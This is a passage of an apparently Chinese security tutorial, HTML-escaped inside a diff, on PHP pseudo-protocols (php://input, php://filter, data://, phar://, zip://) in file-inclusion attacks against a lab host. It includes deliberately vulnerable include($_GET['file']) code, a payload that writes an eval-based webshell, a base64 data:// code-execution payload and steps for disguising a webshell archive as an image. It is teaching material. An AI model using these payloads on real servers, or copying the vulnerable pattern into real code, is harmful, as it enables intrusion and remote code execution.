&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;w&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;lalala&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image020.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到打开了一个文件指针进行写入&lt;/p&gt;
+&lt;h2 id=&#34;phpinput&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput&#34;&gt;#&lt;/a&gt; php://input&lt;/h2&gt;
+&lt;p&gt;php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。&lt;br /&gt;
+&lt;span class=&#34;label warning&#34;&gt;注：enctype=”multipart/form-data” 的时候 php://input 是无效的。&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;phpinput-读取post数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput-读取post数据&#34;&gt;#&lt;/a&gt; php://input （读取 POST 数据）&lt;/h3&gt;
+&lt;p&gt;碰到 file_get_contents () 就要想到用 php://input 绕过，因为 php 伪协议也是可以利用 http 协议的，即可以使用 POST 方式传数据，具体函数意义下一项；&lt;/p&gt;
+&lt;p&gt;测试代码&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# 1.php文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;php://input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;访问 &lt;code&gt;http://192.168.199.130/1.php&lt;/code&gt; burp 抓包，添加 post 数据。&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label&#34;&gt;结果&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image021.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;phpinput写马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput写马&#34;&gt;#&lt;/a&gt; php://input 写马&lt;/h3&gt;
+&lt;p&gt;测试代码&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;条件：&lt;ins&gt;php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &amp;lt; 5.3.0）&lt;/ins&gt;, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行。&lt;/p&gt;
+&lt;p&gt;如果 POST 的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php @eval($_POST[cmd])?&amp;gt;&#39;);?&amp;gt;&lt;/code&gt; &lt;br /&gt;
+&lt;span class=&#34;lebal info&#34;&gt; 图片&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image022.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;当 allow_url_include=Off 时是不行的&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image023.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;phpinput命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput命令执行&#34;&gt;#&lt;/a&gt; php://input 命令执行&lt;/h3&gt;
+&lt;p&gt;测试代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;条件：&lt;ins&gt;php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &amp;lt; 5.30）&lt;/ins&gt;, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行；&lt;br /&gt;
+&lt;span class=&#34;lebal info&#34;&gt;图片&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image024.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;phpfilter本地磁盘文件进行读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpfilter本地磁盘文件进行读取&#34;&gt;#&lt;/a&gt; php://filter（本地磁盘文件进行读取）&lt;/h2&gt;
+&lt;p&gt;元封装器，设计用于 &amp;quot;数据流打开&amp;quot; 时的 &amp;quot;筛选过滤&amp;quot; 应用，对本地磁盘文件进行读写。&lt;/p&gt;
+&lt;p&gt;用法：&lt;br /&gt;
+ &lt;code&gt;?filename=php://filter/convert.base64-encode/resource=xxx.php&lt;/code&gt; &lt;br /&gt;
+ &lt;code&gt;?filename=php://filter/read=convert.base64-encode/resource=xxx.php&lt;/code&gt;  一样。&lt;/p&gt;
+&lt;p&gt;条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；&lt;/p&gt;
+&lt;p&gt;php://filter 参数&lt;/p&gt;
+&lt;table&gt;
+    &lt;tr&gt;
+        &lt;th&gt;名称&lt;/th&gt;
+        &lt;th&gt;描述&lt;/th&gt;
+        &lt;th&gt;备注&lt;/th&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;resource=&amp;lt;要过滤的数据流&amp;gt;&lt;/td&gt;
+        &lt;td&gt;指定了你要筛选过滤的数据流。&lt;/td&gt;
+        &lt;td&gt;必选&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;read=&amp;lt;读链的筛选列表&amp;gt;&lt;/td&gt;
+        &lt;td&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;/td&gt;
+        &lt;td&gt;可选&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;write=&amp;lt;写链的筛选列表&amp;gt;&lt;/td&gt;
+        &lt;td&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;/td&gt;
+        &lt;td&gt;可选&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;&amp;lt;；两个链的筛选列表&amp;gt;&lt;/td&gt;
+        &lt;td&gt;任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。&lt;/td&gt;
+        &lt;td&gt;&amp;nbsp;&lt;/td&gt;
+    &lt;/tr&gt;
+&lt;/table&gt;
+&lt;p&gt;过滤器详解&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=&#34;&gt; https://blog.csdn.net/ni9htmar3/article/details/69812306#t8&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;file伪协议读取文件内容&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#file伪协议读取文件内容&#34;&gt;#&lt;/a&gt; file:// 伪协议 (读取文件内容)&lt;/h2&gt;
+&lt;p&gt;通过 file 协议可以访问本地文件系统，读取到文件的内容&lt;/p&gt;
+&lt;p&gt;测试代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image025.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;data伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#data伪协议&#34;&gt;#&lt;/a&gt; data:// 伪协议&lt;/h2&gt;
+&lt;p&gt;数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 payload 来实现目的；  &lt;code&gt;data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;data://（读取文件）&lt;br /&gt;
+和 php 伪协议的 input 类似，碰到 file_get_contents () 来用； &lt;?php // 打印 &#34;I love PHP&#34; echo file_get_contents(&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;); ?&gt;&lt;/p&gt;
+&lt;p&gt;注意：&amp;lt;span style=&amp;quot;color: rgb (121, 121, 121);&amp;quot;&amp;gt;&amp;lt;?php phpinfo ();, 这类执行代码最后没有？&amp;gt;&amp;lt;/span &amp;gt; 闭合；&lt;/p&gt;
+&lt;p&gt;如果 php.ini 里的 allow_url_include=On（PHP &amp;lt; 5.3.0）, 就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;payload:  &lt;code&gt;http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image026.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;phar伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phar伪协议&#34;&gt;#&lt;/a&gt; phar:// 伪协议&lt;/h2&gt;
+&lt;p&gt;这个参数是就是 php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。&lt;br /&gt;
+用法：?file=phar:// 压缩包 / 内部文件 phar://xxx.png/shell.php。&lt;br /&gt;
+注意： PHP &amp;gt; =5.3.0 压缩包需要是 zip 协议压缩，rar 不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。&lt;br /&gt;
+步骤： 写一个一句话木马文件 shell.php，然后用 zip 协议压缩为 shell.zip，然后将后缀改为 png 等其他格式。&lt;/p&gt;
+&lt;p&gt;测试代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;没有实验完成，先挖个坑。&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;zip伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#zip伪协议&#34;&gt;#&lt;/a&gt; zip:// 伪协议&lt;/h2&gt;
+&lt;p&gt;zip 伪协议和 phar 协议类似，但是用法不一样。&lt;br /&gt;
+用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。&lt;br /&gt;
+条件： PHP &amp;gt; =5.3.0，注意在 windows 下测试要 5.3.0&amp;lt;PHP&amp;lt;5.4 才可以 #在浏览器中要编码为 %23，否则浏览器默认不会传输特殊字符。&lt;/p&gt;
+&lt;p&gt;测试代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;没有实验完成，先挖个坑。&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;封装协议摘要&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#封装协议摘要&#34;&gt;#&lt;/a&gt; 封装协议摘要&lt;/h2&gt;
+&lt;table&gt;
+    &lt;tr&gt;
+        &lt;th&gt;属性&lt;/th&gt;
+        &lt;th&gt;支持&lt;/th&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;受限于 allow_url_include&lt;/td&gt;
+        &lt;td&gt;仅 &lt;em&gt;php://input&lt;/em&gt;、 &lt;em&gt;php://stdin&lt;/em&gt;、 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;允许读取&lt;/td&gt;
+        &lt;td&gt;仅 &lt;em&gt;php://stdin&lt;/em&gt;、 &lt;em&gt;php://input&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt;、 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。
+        &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;允许写入&lt;/td&gt;
+        &lt;td&gt;仅 &lt;em&gt;php://stdout&lt;/em&gt;、 &lt;em&gt;php://stderr&lt;/em&gt;、 &lt;em&gt;php://output&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt;、
+            &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。
+        &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;允许追加&lt;/td&gt;
+        &lt;td&gt;仅 &lt;em&gt;php://stdout&lt;/em&gt;、 &lt;em&gt;php://stderr&lt;/em&gt;、 &lt;em&gt;php://output&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt;、
+            &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;（等于写入）
+        &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;允许同时读写&lt;/td&gt;
+        &lt;td&gt;仅 &lt;em&gt;php://fd&lt;/em&gt;、 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;支持 stat()&lt;/td&gt;
+        &lt;td&gt;仅 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;仅仅支持 stream_select()&lt;/td&gt;
+        &lt;td&gt;&lt;em&gt;php://stdin&lt;/em&gt;、 &lt;em&gt;php://stdout&lt;/em&gt;、 &lt;em&gt;php://stderr&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。
+        &lt;/td&gt;
+    &lt;/tr&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;文件包含姿势&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含姿势&#34;&gt;#&lt;/a&gt; 文件包含姿势&lt;/h1&gt;
+&lt;h2 id=&#34;文件包含session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含session&#34;&gt;#&lt;/a&gt; 文件包含 session&lt;/h2&gt;
+&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;利用条件：&lt;/span&gt;&lt;/p&gt;
